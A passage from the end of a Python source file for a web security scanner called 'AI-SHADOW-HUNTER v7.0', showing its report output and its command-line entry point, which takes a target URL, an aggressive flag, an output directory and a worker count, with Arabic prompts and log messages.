        FinalReportGenerator.generate_html_report(html_file, self.results)
        
        logger.info(f"📄 JSON Report: {json_file}")
        logger.info(f"🌐 HTML Report: {html_file}")

# ----------------------------
# CLI & MAIN
# ----------------------------
def main():
    parser = argparse.ArgumentParser(
        description="AI-SHADOW-HUNTER v7.0 - Advanced Security Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python main.py http://target.com
  python main.py http://target.com --aggressive --max-workers 30
  python main.py http://target.com --output-dir ./results
        """
    )
    
    parser.add_argument("target", nargs='?', default=None, help="Target URL")
    parser.add_argument("--aggressive", action="store_true", help="Enable aggressive testing")
    parser.add_argument("--output-dir", default="results", help="Output directory")
    parser.add_argument("--max-workers", type=int, default=20, help="Max workers")
    
    args = parser.parse_args()
    
    target = args.target
    if not target:
        target = input("🎯 أدخل الـ target URL: ").strip()
    
    if not target.startswith("http"):
        target = "http://" + target
    
    scanner = AIShadowHunterV7(
        target_url=target,
        output_dir=args.output_dir,
        aggressive=args.aggressive,
        max_workers=args.max_workers
    )
    
    scanner.run_scan()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logger.warning("\n⚠️ تم إيقاف الفحص من قبل المستخدم")
    except Exception as e:
        logger.error(f"❌ خطأ: {e}")
